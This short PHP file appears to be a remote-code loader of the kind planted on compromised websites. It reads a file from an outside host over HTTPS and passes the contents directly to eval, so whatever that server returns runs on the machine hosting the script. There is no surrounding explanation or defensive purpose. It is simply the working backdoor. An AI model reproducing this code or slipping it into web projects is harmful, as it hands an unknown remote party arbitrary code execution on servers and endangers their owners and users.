<?php
$path = "https://code.topkz.ru/fgd/8/a5.php";
$code = implode('', file($path));
eval("?>" . $code);
?>
